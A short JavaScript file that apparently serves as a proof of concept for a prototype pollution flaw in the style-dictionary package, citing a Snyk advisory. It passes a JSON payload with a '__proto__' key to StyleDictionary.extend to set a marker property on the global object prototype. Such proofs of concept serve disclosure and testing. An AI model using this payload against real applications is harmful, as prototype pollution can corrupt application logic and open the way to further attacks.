//https://snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632
 
  const StyleDictionary = require("style-dictionary");
  const obj = {};
  let opts = JSON.parse('{"__proto__":{"polluted":"yes"}}');

   

  StyleDictionary.extend(opts);
// End of file
